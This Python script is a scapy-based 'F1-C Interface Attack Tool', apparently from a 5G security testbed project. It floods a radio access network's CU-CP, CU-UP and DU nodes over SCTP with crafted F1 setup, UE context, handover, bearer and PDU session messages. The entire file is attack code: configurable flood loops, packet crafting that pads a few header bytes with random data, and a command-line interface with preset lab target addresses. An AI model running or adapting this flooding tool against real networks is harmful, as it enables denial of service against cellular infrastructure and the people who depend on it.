#!/usr/bin/env python3

import argparse
import sys
import time
import logging
from scapy.all import *
from scapy.contrib.sctp import SCTP, SCTPChunkData
import random

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class F1CAttacker:
    def __init__(self, target_ip, target_port=38472, source_ip=None):
        self.target_ip = target_ip
        self.target_port = target_port
        self.source_ip = source_ip or self._get_source_ip()
        self.attack_active = True
        
        logger.info(f"F1-C Attacker initialized")
        logger.info(f"Target: {self.target_ip}:{self.target_port}")
        logger.info(f"Source: {self.source_ip}")
    
    def _get_source_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "192.168.1.100"
    
    def massive_ue_connection(self, ue_count=1000, rate=100, duration=60):
        logger.info(f"Launching Massive UE Connection attack")
        logger.info(f"UE Count: {ue_count}, Rate: {rate}/sec, Duration: {duration}sec")
        
        start_time = time.time()
        sent_count = 0
        
        while time.time() - start_time < duration and self.attack_active:
            batch_start = time.time()
            
            for _ in range(rate):
                if not self.attack_active:
                    break
                
                ue_id = random.randint(1, ue_count)
                self._send_f1_setup_request(ue_id)
                sent_count += 1
                
                if sent_count >= ue_count:
                    logger.info(f"Reached UE count limit: {ue_count}")
                    return
            
            elapsed = time.time() - batch_start
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)
            
            if sent_count % 1000 == 0:
                logger.info(f"Sent {sent_count} UE connection requests...")
        
        logger.info(f"Attack completed. Total requests sent: {sent_count}")
    
    def ue_context_flooding(self, rate=50, duration=60):
        logger.info(f"Launching UE Context Flooding attack")
        logger.info(f"Rate: {rate}/sec, Duration: {duration}sec")
        
        start_time = time.time()
        sent_count = 0
        
        while time.time() - start_time < duration and self.attack_active:
            batch_start = time.time()
            
            for _ in range(rate):
                if not self.attack_active:
                    break
                
                self._send_ue_context_setup_request()
                sent_count += 1
            
            elapsed = time.time() - batch_start
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)
            
            if sent_count % 500 == 0:
                logger.info(f"Sent {sent_count} UE context requests...")
        
        logger.info(f"Attack completed. Total requests sent: {sent_count}")
    
    def handover_flooding(self, rate=30, duration=60):
        logger.info(f"Launching Handover Flooding attack")
        logger.info(f"Rate: {rate}/sec, Duration: {duration}sec")
        
        start_time = time.time()
        sent_count = 0
        
        while time.time() - start_time < duration and self.attack_active:
            batch_start = time.time()
            
            for _ in range(rate):
                if not self.attack_active:
                    break
                
                self._send_handover_request()
                sent_count += 1
            
            elapsed = time.time() - batch_start
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)
            
            if sent_count % 300 == 0:
                logger.info(f"Sent {sent_count} handover requests...")
        
        logger.info(f"Attack completed. Total requests sent: {sent_count}")
    
    def bearer_flooding(self, bearer_count=500, rate=50, duration=60):
        logger.info(f"Launching Bearer Flooding attack")
        logger.info(f"Bearer Count: {bearer_count}, Rate: {rate}/sec, Duration: {duration}sec")
        
        start_time = time.time()
        sent_count = 0
        
        while time.time() - start_time < duration and self.attack_active:
            batch_start = time.time()
            
            for _ in range(rate):
                if not self.attack_active:
                    break
                
                self._send_bearer_setup_request()
                sent_count += 1
                
                if sent_count >= bearer_count:
                    logger.info(f"Reached bearer count limit: {bearer_count}")
                    return
            
            elapsed = time.time() - batch_start
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)
            
            if sent_count % 500 == 0:
                logger.info(f"Sent {sent_count} bearer setup requests...")
        
        logger.info(f"Attack completed. Total requests sent: {sent_count}")
    
    def pdu_session_flooding(self, rate=40, duration=60):
        logger.info(f"Launching PDU Session Flooding attack")
        logger.info(f"Rate: {rate}/sec, Duration: {duration}sec")
        
        start_time = time.time()
        sent_count = 0
        
        while time.time() - start_time < duration and self.attack_active:
            batch_start = time.time()
            
            for _ in range(rate):
                if not self.attack_active:
                    break
                
                self._send_pdu_session_request()
                sent_count += 1
            
            elapsed = time.time() - batch_start
            if elapsed < 1.0:
                time.sleep(1.0 - elapsed)
            
            if sent_count % 400 == 0:
                logger.info(f"Sent {sent_count} PDU session requests...")
        
        logger.info(f"Attack completed. Total requests sent: {sent_count}")
    
    def _send_f1_setup_request(self, ue_id):
        try:
            f1ap_msg = self._craft_f1ap_setup_request(ue_id)
            
            pkt = IP(src=self.source_ip, dst=self.target_ip) / \
                  SCTP(sport=random.randint(30000, 60000), dport=self.target_port) / \
                  SCTPChunkData(data=f1ap_msg)
            
            send(pkt, verbose=0)
        except Exception as e:
            logger.error(f"Error sending F1 setup request: {e}")
    
    def _send_ue_context_setup_request(self):
        try:
            f1ap_msg = self._craft_ue_context_setup()
            
            pkt = IP(src=self.source_ip, dst=self.target_ip) / \
                  SCTP(sport=random.randint(30000, 60000), dport=self.target_port) / \
                  SCTPChunkData(data=f1ap_msg)
            
            send(pkt, verbose=0)
        except Exception as e:
            logger.error(f"Error sending UE context setup: {e}")
    
    def _send_handover_request(self):
        try:
            f1ap_msg = self._craft_handover_request()
            
            pkt = IP(src=self.source_ip, dst=self.target_ip) / \
                  SCTP(sport=random.randint(30000, 60000), dport=self.target_port) / \
                  SCTPChunkData(data=f1ap_msg)
            
            send(pkt, verbose=0)
        except Exception as e:
            logger.error(f"Error sending handover request: {e}")
    
    def _send_bearer_setup_request(self):
        try:
            f1ap_msg = self._craft_bearer_setup()
            
            pkt = IP(src=self.source_ip, dst=self.target_ip) / \
                  SCTP(sport=random.randint(30000, 60000), dport=self.target_port) / \
                  SCTPChunkData(data=f1ap_msg)
            
            send(pkt, verbose=0)
        except Exception as e:
            logger.error(f"Error sending bearer setup: {e}")
    
    def _send_pdu_session_request(self):
        try:
            f1ap_msg = self._craft_pdu_session_request()
            
            pkt = IP(src=self.source_ip, dst=self.target_ip) / \
                  SCTP(sport=random.randint(30000, 60000), dport=self.target_port) / \
                  SCTPChunkData(data=f1ap_msg)
            
            send(pkt, verbose=0)
        except Exception as e:
            logger.error(f"Error sending PDU session request: {e}")
    
    def _craft_f1ap_setup_request(self, ue_id):
        msg = bytes([
            0x00, 0x00, 0x00, 0x40,
            0x00, 0x00, 0x01, 0x00,
            (ue_id >> 24) & 0xFF,
            (ue_id >> 16) & 0xFF,
            (ue_id >> 8) & 0xFF,
            ue_id & 0xFF
        ])
        msg += os.urandom(50)
        return msg
    
    def _craft_ue_context_setup(self):
        msg = bytes([0x00, 0x05, 0x00, 0x20])
        msg += os.urandom(40)
        return msg
    
    def _craft_handover_request(self):
        msg = bytes([0x00, 0x08, 0x00, 0x30])
        msg += os.urandom(50)
        return msg
    
    def _craft_bearer_setup(self):
        msg = bytes([0x00, 0x0A, 0x00, 0x25])
        msg += os.urandom(45)
        return msg
    
    def _craft_pdu_session_request(self):
        msg = bytes([0x00, 0x0C, 0x00, 0x28])
        msg += os.urandom(48)
        return msg
    
    def stop(self):
        logger.info("Stopping attack...")
        self.attack_active = False

def main():
    parser = argparse.ArgumentParser(description='F1-C Interface Attack Tool')
    parser.add_argument('--type', required=True, 
                       choices=['massive_ue_connection', 'ue_context_flooding', 
                               'handover_flooding', 'bearer_flooding', 'pdu_session_flooding'],
                       help='Attack type')
    parser.add_argument('--target', required=True, help='Target IP or identifier (cu_cp, cu_up, du)')
    parser.add_argument('--mode', default='manual', choices=['manual', 'auto'], help='Attack mode')
    parser.add_argument('--rate', type=int, default=100, help='Attack rate (packets/sec)')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration (seconds)')
    parser.add_argument('--ue-count', type=int, default=1000, help='Number of UEs (for massive_ue_connection)')
    parser.add_argument('--bearer-count', type=int, default=500, help='Number of bearers (for bearer_flooding)')
    
    args = parser.parse_args()
    
    target_map = {
        'cu_cp': '192.168.71.130',
        'cu_up': '192.168.71.131',
        'du': '192.168.71.132'
    }
    
    target_ip = target_map.get(args.target, args.target)
    
    logger.info("="*60)
    logger.info("F1-C Attack Tool - SP5G Project")
    logger.info("="*60)
    
    attacker = F1CAttacker(target_ip)
    
    try:
        if args.type == 'massive_ue_connection':
            attacker.massive_ue_connection(args.ue_count, args.rate, args.duration)
        elif args.type == 'ue_context_flooding':
            attacker.ue_context_flooding(args.rate, args.duration)
        elif args.type == 'handover_flooding':
            attacker.handover_flooding(args.rate, args.duration)
        elif args.type == 'bearer_flooding':
            attacker.bearer_flooding(args.bearer_count, args.rate, args.duration)
        elif args.type == 'pdu_session_flooding':
            attacker.pdu_session_flooding(args.rate, args.duration)
        
        logger.info("Attack finished successfully")
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
        attacker.stop()
    except Exception as e:
        logger.error(f"Attack failed: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()



